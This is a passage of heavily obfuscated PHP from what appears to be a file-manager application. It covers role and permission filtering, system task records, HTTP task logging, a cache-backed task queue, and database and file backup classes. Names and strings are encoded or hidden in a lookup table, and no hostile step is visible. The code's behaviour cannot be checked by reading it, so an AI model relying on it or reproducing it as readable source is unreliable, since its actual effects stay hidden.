$Üïá©ˆ = parent::listData($£ ğáŒ—); $Ô™‡Ìï = $this->findByName($æ©Ã°ÎÎ[$®½™š®¼[32]]); if (!$Üïá©ˆ || $Ô™‡Ìï && $Ô™‡Ìï[$®½™š®¼[399]] != $Üïá©ˆ[$®½™š®¼[399]]) { return !1; } if ($Ô™‡Ìï[$®½™š®¼[2064]] == 1) { $æ©Ã°ÎÎ = array($®½™š®¼[32] => $æ©Ã°ÎÎ[$®½™š®¼[32]], $®½™š®¼[1885] => $æ©Ã°ÎÎ[$®½™š®¼[1885]]); } $this->filterAuth($æ©Ã°ÎÎ[$®½™š®¼[413]]); return parent::update($£ ğáŒ—, $æ©Ã°ÎÎ); } public function remove($»øÛâ¡) { $ÏÚ’ß = parent::listData($»øÛâ¡); if (!$ÏÚ’ß || $ÏÚ’ß[$_SERVER[§ŒØóıü][1290]]) { return !1; } return parent::remove($»øÛâ¡); } public function add($»½Úç ) { $»ìúËó³ =& $_SERVER[§ŒØóıü]; $ƒş¢“¿´ = $»½Úç [$»ìúËó³[32]]; if ($this->findByName($ƒş¢“¿´)) { return !1; } $ì‡ÔÎ¼Ä = array($»ìúËó³[420] => $ƒş¢“¿´, $»ìúËó³[1868] => $»ìúËó³[12], $»ìúËó³[1864] => $»ìúËó³[1872], $»ìúËó³[2299] => 1, $»ìúËó³[1867] => 0, $»ìúËó³[2300] => 0, $»ìúËó³[1866] => $this->getSort()); $»½Úç  = array_merge($ì‡ÔÎ¼Ä, $»½Úç ); $this->filterAuth($»½Úç [$»ìúËó³[413]]); return parent::insert($»½Úç ); } private function getSort() { $Ç¬òòø =& $_SERVER[§ŒØóıü]; $ê½ÆßÑ = parent::listData(); $ÃÛšêšÕ = array_to_keyvalue($ê½ÆßÑ, $Ç¬òòø[12], $Ç¬òòø[1886]); return empty($ÃÛšêšÕ) ? 0 : max($ÃÛšêšÕ) + 1; } private function filterAuth(&$¾›Ç¢ç‚) { $ÖÙÉÏµŠ =& $_SERVER[§ŒØóıü]; $õ’¡¤ü = array(); $”¤ÉÜÒ¨ = array_filter(explode($ÖÙÉÏµŠ[50], $¾›Ç¢ç‚)); foreach ($”¤ÉÜÒ¨ as $¾›Ç¢ç‚) { $Ù÷ÅÎÕÚ = explode($ÖÙÉÏµŠ[10], $¾›Ç¢ç‚); if ($Ù÷ÅÎÕÚ[0] == $ÖÙÉÏµŠ[2301] && $Ù÷ÅÎÕÚ[1] != $ÖÙÉÏµŠ[1196]) { $ı‘„Öí¢ = $Ù÷ÅÎÕÚ[0] . $ÖÙÉÏµŠ[10] . $Ù÷ÅÎÕÚ[1] . $ÖÙÉÏµŠ[2302]; if (!in_array($ı‘„Öí¢, $”¤ÉÜÒ¨)) { $õ’¡¤ü[] = $ı‘„Öí¢; } } $õ’¡¤ü[] = $¾›Ç¢ç‚; } $¾›Ç¢ç‚ = implode($ÖÙÉÏµŠ[50], $õ’¡¤ü); } public function findRoleDefault() { $ºÊ¾›šƒ =& $_SERVER[§ŒØóıü]; $‡Ì‰š¡ = parent::listData(); $–å±Õ¿ = !1; foreach ($‡Ì‰š¡ as $Øä¸…‹¦) { if (!$Øä¸…‹¦ || $Øä¸…‹¦[$ºÊ¾›šƒ[1884]] == $ºÊ¾›šƒ[198] || $Øä¸…‹¦[$ºÊ¾›šƒ[2064]] == 1) { continue; } if (strstr($Øä¸…‹¦[$ºÊ¾›šƒ[413]], $ºÊ¾›šƒ[2303])) { continue; } if (!strstr($Øä¸…‹¦[$ºÊ¾›šƒ[413]], $ºÊ¾›šƒ[2304])) { continue; } if (!$–å±Õ¿) { $–å±Õ¿ = $Øä¸…‹¦; continue; } $‚Õû£˜¶ = explode($ºÊ¾›šƒ[50], $–å±Õ¿[$ºÊ¾›šƒ[413]]); $ßÒ¦ùÔ = explode($ºÊ¾›šƒ[50], $Øä¸…‹¦[$ºÊ¾›šƒ[413]]); if (count($‚Õû£˜¶) > count($ßÒ¦ùÔ)) { $–å±Õ¿ = $Øä¸…‹¦; } } return $–å±Õ¿ ? $–å±Õ¿[$ºÊ¾›šƒ[399]] : $ºÊ¾›šƒ[12]; } public function sort($÷öùÇÕİ, $ß¡•Â×¼) { return parent::update($÷öùÇÕİ, $ß¡•Â×¼); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\x74\141\x73\153\x4c\151\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\x74\x79\160\145", "\145\x76\145\156\x74", "\164\151\155\x65", "\x64\x65\163\x63", "\163\x79\163\164\x65\x6d", "\145\x6e\141\x62\x6c\x65", "\154\x61\x73\164\x52\165\156", "\163\157\x72\x74"); public function listData($§â¸¶‘ = false, $ëŒªú¥” = "\x73\x6f\x72\164", $¼¬Ôş×ñ = false) { return parent::listData($§â¸¶‘, $ëŒªú¥”, $¼¬Ôş×ñ); } public function add($’Á‹µÛ) { $èı¶´»§ =& $_SERVER[§ŒØóıü]; $ÍÅà×ØÒ = $this->findByName($’Á‹µÛ[$èı¶´»§[32]]); if ($ÍÅà×ØÒ) { return !1; } $’Á‹µÛ[$èı¶´»§[1633]] = 0; $’Á‹µÛ[$èı¶´»§[1886]] = $this->getSort(); return parent::insert($’Á‹µÛ); } private function getSort() { $ÊÙê¥‘² =& $_SERVER[§ŒØóıü]; $½æÕ‚ç© = parent::listData(); $áğõ‘úß = array_to_keyvalue($½æÕ‚ç©, $ÊÙê¥‘²[12], $ÊÙê¥‘²[1886]); return empty($áğõ‘úß) ? 0 : max($áğõ‘úß) + 1; } public function update($ƒÌ¾¾»ö, $Ó­ğÀ›) { $«ŒœÉÖË =& $_SERVER[§ŒØóıü]; $¶ÆîÎ—ˆ = $this->listData($ƒÌ¾¾»ö); $ªã±Æ“š = $this->findByName($Ó­ğÀ›[$«ŒœÉÖË[32]]); if (!$¶ÆîÎ—ˆ || $ªã±Æ“š && $ªã±Æ“š[$«ŒœÉÖË[399]] != $¶ÆîÎ—ˆ[$«ŒœÉÖË[399]]) { return !1; } return parent::update($ƒÌ¾¾»ö, $Ó­ğÀ›); } public function remove($ÚˆùñÖŞ, $¿Ò„úï® = false) { $Â½¢¨ö· =& $_SERVER[§ŒØóıü]; $ÕÑá¿Ÿß = $this->listData($ÚˆùñÖŞ); if (!$ÕÑá¿Ÿß) { return; } if (!$¿Ò„úï® && $ÕÑá¿Ÿß[$Â½¢¨ö·[1290]] == $Â½¢¨ö·[88]) { return !1; } return parent::remove($ÚˆùñÖŞ); } public function enable($ëüµÆ®À, $¹«»•Å) { return $this->update($ëüµÆ®À, array($_SERVER[§ŒØóıü][2293] => $¹«»•Å)); } public function run($‘â™¾³Õ) { return $this->update($‘â™¾³Õ, array($_SERVER[§ŒØóıü][2305] => time())); } } goto CÀœë–òÄ; AªøÍÖÄ„«: class TaskHttp extends Task { protected function startAfter() { $Ô·ï©¹Ş =& $_SERVER[§ŒØóıü]; $ƒ˜ò¹¥ =& $this->task; $ƒ˜ò¹¥[$Ô·ï©¹Ş[1750]] = 1; Hook::bind($Ô·ï©¹Ş[1718], array($this, $Ô·ï©¹Ş[1751])); Hook::bind($Ô·ï©¹Ş[1720], array($this, $Ô·ï©¹Ş[1752])); Hook::bind($Ô·ï©¹Ş[1722], array($this, $Ô·ï©¹Ş[1753])); } protected function endAfter() { $’»ĞÕÔØ =& $_SERVER[§ŒØóıü]; Hook::unbind($’»ĞÕÔØ[1718], array($this, $’»ĞÕÔØ[1751])); Hook::unbind($’»ĞÕÔØ[1720], array($this, $’»ĞÕÔØ[1752])); Hook::unbind($’»ĞÕÔØ[1722], array($this, $’»ĞÕÔØ[1753])); } public function progressStart($…Ú¦‚‘) { $ø·Å˜“™ =& $_SERVER[§ŒØóıü]; $¯”•´¸ƒ = curl_getinfo($…Ú¦‚‘); self::log($ø·Å˜“™[1754] . $¯”•´¸ƒ[$ø·Å˜“™[307]]); self::valueSet($this->task[$ø·Å˜“™[399]], $this->task); } public function progressEnd($ì°¥Œ‹—) { $ ÊÚ€şÍ =& $_SERVER[§ŒØóıü]; self::log($ ÊÚ€şÍ[1755] . $this->task[$ ÊÚ€şÍ[399]]); $this->end(); } public function progress($£·²Î¼Ñ, $˜Ÿ¢í, $¾ÕşáË, $›ƒÈ›¿, $€½“óîË) { $ıÓ’á =& $_SERVER[§ŒØóıü]; $¢±à× =& $this->task; if ($€½“óîË > 0) { $¢±à×[$ıÓ’á[792]] = $¢±à×[$ıÓ’á[792]] == 0 ? $›ƒÈ›¿ : $¢±à×[$ıÓ’á[792]]; $¢±à×[$ıÓ’á[1674]] = $€½“óîË; } else { if ($¾ÕşáË > 0) { $¢±à×[$ıÓ’á[792]] = $¢±à×[$ıÓ’á[792]] == 0 ? $˜Ÿ¢í : $¢±à×[$ıÓ’á[792]]; $¢±à×[$ıÓ’á[1674]] = $¾ÕşáË; } } $this->update(); self::log("\160\162\x6f\x67\x72\x65\163\x73\x48\x74\164\x70\72\x64\157\167\x6e\x3a{$¾ÕşáË}\x2f{$˜Ÿ¢í}\73\x20\x75\x70\154\x6f\x61\144\x3a{$€½“óîË}\x2f{$›ƒÈ›¿}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¾Ğ²˜ı×, $…‚É‚¡ = '', $¦Ô»æ¼í = 0, $ÃòŒô€ = '') { $âÖòÌµ× =& $_SERVER[§ŒØóıü]; $ìİÈÇÌê = new Task($¾Ğ²˜ı×, $…‚É‚¡, $¦Ô»æ¼í, $ÃòŒô€); $GLOBALS[$âÖòÌµ×[1756] . $¾Ğ²˜ı×] = new TaskLog($âÖòÌµ×[1657], $ìİÈÇÌê, $ÃòŒô€); return $ìİÈÇÌê; } public function __construct($šş§«úù = '', $„Ç‹§ôú = '', $ÚÄÎÍ±• = '') { $”µ¨çíù =& $_SERVER[§ŒØóıü]; if (!$šş§«úù) { $šş§«úù = $”µ¨çíù[1657]; } $æôÌ†ôÏ = $šş§«úù . $”µ¨çíù[386] . rand_string(10); if (!$ÚÄÎÍ±•) { $ÚÄÎÍ±• = $šş§«úù . $”µ¨çíù[53] . $ÚÄÎÍ±•; } switch ($šş§«úù) { case $”µ¨çíù[1657]: if (!$„Ç‹§ôú || !$„Ç‹§ôú->task) { return echoLog($šş§«úù . $”µ¨çíù[1757]); } $¿ŒÈ””¨ = $„Ç‹§ôú; $æôÌ†ôÏ = $¿ŒÈ””¨->task[$”µ¨çíù[399]]; $šş§«úù = $¿ŒÈ””¨->task[$”µ¨çíù[399]]; if (!$¿ŒÈ””¨->task[$”µ¨çíù[1573]]) { $¿ŒÈ””¨->task[$”µ¨çíù[1573]] = $ÚÄÎÍ±• ? $ÚÄÎÍ±• : $šş§«úù; } break; case $”µ¨çíù[1758]: if (!$„Ç‹§ôú) { return echoLog($šş§«úù . $”µ¨çíù[1759]); } $“‚Úı·œ = is_string($„Ç‹§ôú) ? array($„Ç‹§ôú) : $„Ç‹§ôú; $¿ŒÈ””¨ = new TaskFileTransfer($æôÌ†ôÏ, $šş§«úù, 0, $ÚÄÎÍ±• ? $ÚÄÎÍ±• : $“‚Úı·œ[0]); foreach ($“‚Úı·œ as $½Û„Ç–) { $¿ŒÈ””¨->addPath($½Û„Ç–); } break; case $”µ¨çíù[313]: if (!$„Ç‹§ôú) { return echoLog($šş§«úù . $”µ¨çíù[1759]); } $“‚Úı·œ = is_string($„Ç‹§ôú) ? array($„Ç‹§ôú) : $„Ç‹§ôú; $¿ŒÈ””¨ = new TaskZip($æôÌ†ôÏ, $šş§«úù, 0, $ÚÄÎÍ±• ? $ÚÄÎÍ±• : $“‚Úı·œ[0]); foreach ($“‚Úı·œ as $½Û„Ç–) { $¿ŒÈ””¨->addPath($½Û„Ç–); } break; case $”µ¨çíù[1220]: if (!$„Ç‹§ôú) { return echoLog($šş§«úù . $”µ¨çíù[1759]); } $¿ŒÈ””¨ = new TaskUnZip($æôÌ†ôÏ, $šş§«úù, 0, $ÚÄÎÍ±• ? $ÚÄÎÍ±• : $„Ç‹§ôú); if ($„Ç‹§ôú) { $¿ŒÈ””¨->addFile($„Ç‹§ôú); } break; case $”µ¨çíù[148]: $¿ŒÈ””¨ = new TaskHttp($æôÌ†ôÏ, $šş§«úù); break; default: return; break; } $this->task = $¿ŒÈ””¨; $this->taskID = $æôÌ†ôÏ; Hook::bind($”µ¨çíù[1694], array($this, $”µ¨çíù[1760])); Hook::bind($”µ¨çíù[1696], array($this, $”µ¨çíù[1761])); Hook::bind($”µ¨çíù[1690], array($this, $”µ¨çíù[1762])); echoLog($”µ¨çíù[1763] . $¿ŒÈ””¨->task[$”µ¨çíù[1573]]); } public function __destruct() { $this->end(); } public function end($éÁÒÁª° = '') { $ûƒ¸§®— =& $_SERVER[§ŒØóıü]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($éÁÒÁª°); $this->task = !1; $this->taskID = !1; Hook::unbind($ûƒ¸§®—[1694], array($this, $ûƒ¸§®—[1760])); Hook::unbind($ûƒ¸§®—[1696], array($this, $ûƒ¸§®—[1761])); Hook::unbind($ûƒ¸§®—[1690], array($this, $ûƒ¸§®—[1762])); } public function taskUpdate($¹ïÊ©ó) { $ó©Æ¦¶‚ =& $_SERVER[§ŒØóıü]; if (!$¹ïÊ©ó || $this->taskID != $¹ïÊ©ó[$ó©Æ¦¶‚[399]]) { return; } $©àáÁ¹± = 20; $–îÄİŠà = intval($¹ïÊ©ó[$ó©Æ¦¶‚[1675]] * $©àáÁ¹±); $îôê¢Õ¿ = $ó©Æ¦¶‚[162] . str_repeat($ó©Æ¦¶‚[890], $–îÄİŠà) . $ó©Æ¦¶‚[1020] . str_repeat($ó©Æ¦¶‚[53], $©àáÁ¹± - $–îÄİŠà) . $ó©Æ¦¶‚[164]; $ˆıù¹« = $îôê¢Õ¿ . sprintf($ó©Æ¦¶‚[1764], $¹ïÊ©ó[$ó©Æ¦¶‚[1675]] * 100) . $ó©Æ¦¶‚[1765]; $§ˆ·¨úÒ = $ˆıù¹« . $¹ïÊ©ó[$ó©Æ¦¶‚[1674]] . $ó©Æ¦¶‚[8] . $¹ïÊ©ó[$ó©Æ¦¶‚[792]] . LNG($ó©Æ¦¶‚[1766]); $ª¦ÎâÎ = $ó©Æ¦¶‚[12]; if ($¹ïÊ©ó[$ó©Æ¦¶‚[1750]]) { $§ˆ·¨úÒ = $ˆıù¹« . size_format($¹ïÊ©ó[$ó©Æ¦¶‚[1674]]) . $ó©Æ¦¶‚[8] . size_format($¹ïÊ©ó[$ó©Æ¦¶‚[792]]); $ª¦ÎâÎ = size_format($¹ïÊ©ó[$ó©Æ¦¶‚[1676]]) . $ó©Æ¦¶‚[1767]; } if ($¹ïÊ©ó[$ó©Æ¦¶‚[1070]]) { $¹ïÊ©ó[$ó©Æ¦¶‚[1724]] = $¹ïÊ©ó[$ó©Æ¦¶‚[1070]] . $ó©Æ¦¶‚[53] . $¹ïÊ©ó[$ó©Æ¦¶‚[1724]]; } if ($¹ïÊ©ó[$ó©Æ¦¶‚[1724]]) { $·‚†¡‰ã = $ó©Æ¦¶‚[12]; if ($¹ïÊ©ó[$ó©Æ¦¶‚[1726]]) { $·‚†¡‰ã = $ó©Æ¦¶‚[50] . size_format($¹ïÊ©ó[$ó©Æ¦¶‚[1727]]) . $ó©Æ¦¶‚[8] . size_format($¹ïÊ©ó[$ó©Æ¦¶‚[1726]]); } $ª¦ÎâÎ .= $¹ïÊ©ó[$ó©Æ¦¶‚[1724]] . $·‚†¡‰ã; } if ($¹ïÊ©ó[$ó©Æ¦¶‚[769]] && !$¹ïÊ©ó[$ó©Æ¦¶‚[1726]]) { $ª¦ÎâÎ .= $ó©Æ¦¶‚[53] . size_format($¹ïÊ©ó[$ó©Æ¦¶‚[1731]]) . $ó©Æ¦¶‚[8] . size_format($¹ïÊ©ó[$ó©Æ¦¶‚[769]]); } echoLog($§ˆ·¨úÒ . $ó©Æ¦¶‚[53] . $ª¦ÎâÎ, !0); } public function taskEnd($Ù¢›ûªˆ) { $È›ôïù =& $_SERVER[§ŒØóıü]; if (!$Ù¢›ûªˆ || $this->taskID != $Ù¢›ûªˆ[$È›ôïù[399]]) { return; } $™·éû¢ = $Ù¢›ûªˆ ? $Ù¢›ûªˆ[$È›ôïù[1674]] . $È›ôïù[8] . $Ù¢›ûªˆ[$È›ôïù[792]] . LNG($È›ôïù[1766]) . $È›ôïù[71] : $È›ôïù[12]; echoLog($È›ôïù[1768] . $Ù¢›ûªˆ[$È›ôïù[1573]] . ($Ù¢›ûªˆ[$È›ôïù[453]] ? $È›ôïù[71] . $Ù¢›ûªˆ[$È›ôïù[453]] : $È›ôïù[12]) . $È›ôïù[71] . $™·éû¢ . $È›ôïù[1769] . sprintf($È›ôïù[856], timeFloat() - $Ù¢›ûªˆ[$È›ôïù[1677]]) . $È›ôïù[1689]); $this->end(); } public function taskKill($Ğ•æ¸ú¼) { $àá…ğíø =& $_SERVER[§ŒØóıü]; if (!$Ğ•æ¸ú¼ || $this->taskID != $Ğ•æ¸ú¼[$àá…ğíø[399]]) { return; } echoLog($àá…ğíø[1770] . $Ğ•æ¸ú¼[$àá…ğíø[1573]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\x73\x6b\121\165\x65\165\x65\x4c\145\156\147\164\150"; const QUEUE_DATA = "\x74\141\x73\153\121\165\x65\165\x65\x44\x61\164\x61"; public static $listData = false; public static function initTask() { } public static function add($ü¹§åÔ÷, $Äî Œš  = array(), $²¬¥Ì³© = '', $£æáÀ = '') { $„ü°Ü½ =& $_SERVER[§ŒØóıü]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($£æáÀ && array_find_by_field(self::$listData, $„ü°Ü½[94], $£æáÀ)) { return !0; } self::$listData[] = array($„ü°Ü½[264] => $ü¹§åÔ÷, $„ü°Ü½[1771] => $Äî Œš , $„ü°Ü½[453] => $²¬¥Ì³©, $„ü°Ü½[94] => $£æáÀ); return !0; } public static function addSubmit() { $Ê·Í¦É =& $_SERVER[§ŒØóıü]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($Ê·Í¦É[1772] . json_encode_force(array_to_keyvalue(self::$listData, $Ê·Í¦É[12], $Ê·Í¦É[453])), $Ê·Í¦É[1773]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Ğ¤¢õÉ, $ÏŒ§ Ë× = array(), $„ùë‘Ûç = '', $—¦‡ïñÃ = '') { $‹ô³©‚´ =& $_SERVER[§ŒØóıü]; if (self::count() >= self::MAX_LENGTH) { return !1; } $¤¦Ó„Œ± = self::getAll(); if ($—¦‡ïñÃ && array_find_by_field($¤¦Ó„Œ±, $‹ô³©‚´[94], $—¦‡ïñÃ)) { return !0; } $¤¦Ó„Œ±[] = array($‹ô³©‚´[264] => $Ğ¤¢õÉ, $‹ô³©‚´[1771] => $ÏŒ§ Ë×, $‹ô³©‚´[453] => $„ùë‘Ûç, $‹ô³©‚´[94] => $—¦‡ïñÃ); write_log($‹ô³©‚´[1772] . $„ùë‘Ûç, $‹ô³©‚´[1773]); self::setAll($¤¦Ó„Œ±); return !0; } public static function run() { $®”é‡¥Ü =& $_SERVER[§ŒØóıü]; $Ëä”½ŸÑ = self::getAll(); $®ˆÎ˜î‰ = array_shift($Ëä”½ŸÑ); if (!$®ˆÎ˜î‰) { return !1; } self::setAll($Ëä”½ŸÑ); $è–â”· = timeFloat(); try { Hook::apply($®ˆÎ˜î‰[$®”é‡¥Ü[264]], $®ˆÎ˜î‰[$®”é‡¥Ü[1771]]); } catch (Exception $ÃØ›Îş) { } $•µ”§àï = number_format(timeFloat() - $è–â”·, 3) . $®”é‡¥Ü[1689]; write_log($®”é‡¥Ü[1774] . $®ˆÎ˜î‰[$®”é‡¥Ü[453]] . $®”é‡¥Ü[1775] . $•µ”§àï, $®”é‡¥Ü[1773]); return !0; } public static function count() { $¤Ä£‹Ş÷ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$¤Ä£‹Ş÷) { return 0; } return intval($¤Ä£‹Ş÷); } public static function getAll() { $¼æ„©Ÿ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$¼æ„©Ÿ) { return array(); } return $¼æ„©Ÿ; } public static function setAll($ÉíÆæí) { $÷”ô¬¾ë = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ÉíÆæí), $÷”ô¬¾ë); Cache::set(self::QUEUE_DATA, $ÉíÆæí, $÷”ô¬¾ë); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto fÃ£¤ö÷Øì; f»Ë¯ÌÈ¯ö: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ÃÀüñş¡ =& $_SERVER[§ŒØóıü]; $æˆƒûÔƒ = Backup::get(); self::$io = $æˆƒûÔƒ[$ÃÀüñş¡[757]]; self::$name = $æˆƒûÔƒ[$ÃÀüñş¡[32]]; $öÕ•ç¯± = new DbManage(); $ ’£ãÒò = $öÕ•ç¯±->dbType(); $ êè†ë† = array($ÃÀüñş¡[782] => $ ’£ãÒò, $ÃÀüñş¡[783] => time()); Backup::set($ êè†ë†); $ã¡½œï = $this->tmpFilesPath() . $ÃÀüñş¡[784] . self::$name . $ÃÀüñş¡[8]; del_dir($ã¡½œï); mk_dir($ã¡½œï); $€Ôß…¾ = $åâôŠéô = 0; $Ìª³¬î„ = new Task($ÃÀüñş¡[785], $ÃÀüñş¡[786], 0, LNG($ÃÀüñş¡[787]) . $ÃÀüñş¡[788] . LNG($ÃÀüñş¡[789])); try { $¬œÙó¼Ô = $öÕ•ç¯±->db()->getTables(); } catch (Exception $ ·²İ¶ª) { $Ìª³¬î„->end(); return !1; } $¬œÙó¼Ô = array_diff($¬œÙó¼Ô, array($ÃÀüñş¡[790], $ÃÀüñş¡[791])); foreach ($¬œÙó¼Ô as $Ÿé¥ĞìÆ) { $€Ôß…¾ += $öÕ•ç¯±->model($Ÿé¥ĞìÆ)->count(); } $Ìª³¬î„->task[$ÃÀüñş¡[792]] = $€Ôß…¾; $GLOBALS[$ÃÀüñş¡[793]] = self::$name; foreach ($¬œÙó¼Ô as $Ÿé¥ĞìÆ) { $á¦ĞÂ¤© = $ã¡½œï . $Ÿé¥ĞìÆ . $ÃÀüñş¡[794]; $Î¨ÓäŞ† = null; if ($Ÿé¥ĞìÆ == $ÃÀüñş¡[795] && (!isset($æˆƒûÔƒ[$ÃÀüñş¡[760]]) || $æˆƒûÔƒ[$ÃÀüñş¡[760]] == $ÃÀüñş¡[198])) { $Î¨ÓäŞ† = self::$io; } $åâôŠéô += $öÕ•ç¯±->sqlFromDb($Ÿé¥ĞìÆ, $á¦ĞÂ¤©, $Ìª³¬î„, $Î¨ÓäŞ†); } unset($GLOBALS[$ÃÀüñş¡[793]]); $Ìª³¬î„->end(); if ($åâôŠéô > $€Ôß…¾) { $€Ôß…¾ = $åâôŠéô; } $ êè†ë† = array($ÃÀüñş¡[782] => $ ’£ãÒò, $ÃÀüñş¡[779] => 1, $ÃÀüñş¡[796] => $€Ôß…¾, $ÃÀüñş¡[797] => $åâôŠéô, $ÃÀüñş¡[798] => time()); Backup::set($ êè†ë†); if ($€Ôß…¾ - $åâôŠéô > 0) { $å‰ÁºàÂ = $ÃÀüñş¡[799]; if (stristr(I18n::getType(), $ÃÀüñş¡[800])) { $å‰ÁºàÂ = $ÃÀüñş¡[801]; } write_log(array($å‰ÁºàÂ, $ êè†ë†), $ÃÀüñş¡[786]); return !1; } return !0; } private function tmpFilesPath() { $¬ÕôÕ =& $_SERVER[§ŒØóıü]; $™¾î­ = TEMP_FILES; if ($GLOBALS[$¬ÕôÕ[6]][$¬ÕôÕ[89]][$¬ÕôÕ[802]]) { $™¾î­ = $GLOBALS[$¬ÕôÕ[6]][$¬ÕôÕ[89]][$¬ÕôÕ[802]]; if (!mk_dir($™¾î­) || !is_writable($™¾î­) || !IO::mkfile($™¾î­ . $¬ÕôÕ[803])) { $™¾î­ = TEMP_FILES; } } return $™¾î­; } } class BackupDbFile { public function __construct() { } public function index() { $®…á›‹ó =& $_SERVER[§ŒØóıü]; $­–ö¢‰¥ = Backup::get(); $â¬ŞåÅº = $­–ö¢‰¥[$®…á›‹ó[32]]; $¿¯å¸É = $this->tmpFilesPath() . "\x62\x61\143\x6b\x75\160\137{$â¬ŞåÅº}\57"; $ˆÈş¶…Ò = $this->backupPath($­–ö¢‰¥); if (!($ˆÈş¶…Ò = IO::mkdir($ˆÈş¶…Ò))) { return !1; } $æ¥·«Í¶ = IO::listPath($¿¯å¸É); $ò¸ˆœ­› = isset($æ¥·«Í¶[$®…á›‹ó[83]]) ? $æ¥·«Í¶[$®…á›‹ó[83]] : array(); $ñ ×øæ… = array_sum(array_column($ò¸ˆœ­›, $®…á›‹ó[76])); if (!$ñ ×øæ…) { return !1; } $ƒİÄ§ = array($®…á›‹ó[804] => $ñ ×øæ…, $®…á›‹ó[805] => time()); Backup::set($ƒİÄ§); $‹Øşªâ© = new TaskFileTransfer($®…á›‹ó[806], $®…á›‹ó[786], count($ò¸ˆœ­›), LNG($®…á›‹ó[787]) . $®…á›‹ó[386] . LNG($®…á›‹ó[789]) . $®…á›‹ó[807]); $‹Øşªâ©->task[$®…á›‹ó[769]] = $ñ ×øæ…; foreach ($æ¥·«Í¶[$®…á›‹ó[83]] as $ÀÚËğµÚ) { $ÊşÇƒØ = IO::move($ÀÚËğµÚ[$®…á›‹ó[84]], $ˆÈş¶…Ò); if (!$ÊşÇƒØ) { $‹Øşªâ©->end(); $•±Ì¶®„ = IO::getLastError($®…á›‹ó[808] . $ÀÚËğµÚ[$®…á›‹ó[84]] . $®…á›‹ó[809] . $ˆÈş¶…Ò . $®…á›‹ó[164]); write_log($•±Ì¶®„, $®…á›‹ó[786]); return !1; } } $Å¥Æ¤™‘ = new DbManage(); $”Š¢¡‰› = $Å¥Æ¤™‘->getSqlFile(); if (!$”Š¢¡‰›[$®…á›‹ó[810]] || !$”Š¢¡‰›[$®…á›‹ó[13]]) { return !1; } IO::move($”Š¢¡‰›[$®…á›‹ó[810]], $ˆÈş¶…Ò); IO::move($”Š¢¡‰›[$®…á›‹ó[13]], $ˆÈş¶…Ò); $‹Øşªâ©->end(); $ƒİÄ§ = array($®…á›‹ó[811] => $ñ ×øæ…, $®…á›‹ó[812] => time()); Backup::set($ƒİÄ§); return !0; } private function backupPath($Õä‡âÆÂ) { $¿‡°ó =& $_SERVER[§ŒØóıü]; $ëîû£ = $Õä‡âÆÂ[$¿‡°ó[32]]; $ìëº“¬˜ = Model($¿‡°ó[776])->get($¿‡°ó[777]); $ïâü·”ß = substr(md5($¿‡°ó[778] . $ìëº“¬˜ . $ëîû£), 0, 8); return "\x7b\151\x6f\x3a{$Õä‡âÆÂ[$¿‡°ó[757]]}\175\x2f\x64\141\164\x61\142\141\163\x65\57\142\x61\x63\153\165\160\x2f" . $ëîû£ . $¿‡°ó[11] . $ïâü·”ß; } private function tmpFilesPath() { $öÌ¾â„ =& $_SERVER[§ŒØóıü]; $Ìòü´‡å = TEMP_FILES; if ($GLOBALS[$öÌ¾â„[6]][$öÌ¾â„[89]][$öÌ¾â„[802]]) { $Ìòü´‡å = $GLOBALS[$öÌ¾â„[6]][$öÌ¾â„[89]][$öÌ¾â„[802]]; if (!mk_dir($Ìòü´‡å) || !is_writable($Ìòü´‡å) || !IO::mkfile($Ìòü´‡å . $öÌ¾â„[803])) { $Ìòü´‡å = TEMP_FILES; } } return $Ìòü´‡å; } } class BackupFile { public function __construct() { } public function index() { $í§•õÅİ = Backup::get(); $ÓÊ³ö²„ = $í§•õÅİ[$_SERVER[§ŒØóıü][293]][$_SERVER[§ŒØóıü][200]][$_SERVER[§ŒØóıü][468]]; $¨ˆîáÈÙ = array($_SERVER[§ŒØóıü][469] => array($_SERVER[§ŒØóıü][813], $ÓÊ³ö²„), $_SERVER[§ŒØóıü][814] => array($_SERVER[§ŒØóıü][331], $í§•õÅİ[$_SERVER[§ŒØóıü][757]])); $äèÚÜı² = (int) Model($_SERVER[§ŒØóıü][795])->where($¨ˆîáÈÙ)->count($_SERVER[§ŒØóıü][468]); $¢É¼ìä = (int) Model($_SERVER[§ŒØóıü][795])->where($¨ˆîáÈÙ)->sum($_SERVER[§ŒØóıü][76]); $±Ï å¶Ÿ = new TaskFileTransfer($_SERVER[§ŒØóıü][815], $_SERVER[§ŒØóıü][786], $äèÚÜı², LNG($_SERVER[§ŒØóıü][787]) . $_SERVER[§ŒØóıü][788] . LNG($_SERVER[§ŒØóıü][816])); $±Ï å¶Ÿ->task[$_SERVER[§ŒØóıü][769]] = $¢É¼ìä; $ƒ³ÍÄùÕ = array($_SERVER[§ŒØóıü][817] => $äèÚÜı², $_SERVER[§ŒØóıü][818] => $¢É¼ìä, $_SERVER[§ŒØóıü][819] => time()); Backup::set($ƒ³ÍÄùÕ); $Å¹—€å£ = !0; $ÜÌûĞ£ = $this->storeIds(); $©âµå‡ú = 1; $ºÖÒÇ‚ = 1000; $–„ìŒÒŸ = $Ÿá‚Ù¼ = 0; $¥Šïó¹ = array(); $ªßˆœ£» = $ê—ñ»Ãœ = 0; do { $œ¢¼‡Ø® = $_SERVER[§ŒØóıü][820]; $ÎÅ‰ƒ“ = Model($_SERVER[§ŒØóıü][795])->where($¨ˆîáÈÙ)->field($œ¢¼‡Ø®)->order($_SERVER[§ŒØóıü][821])->selectPage($ºÖÒÇ‚, $©âµå‡ú); $³´Ú£ïÆ = !empty($ÎÅ‰ƒ“[$_SERVER[§ŒØóıü][369]]) ? 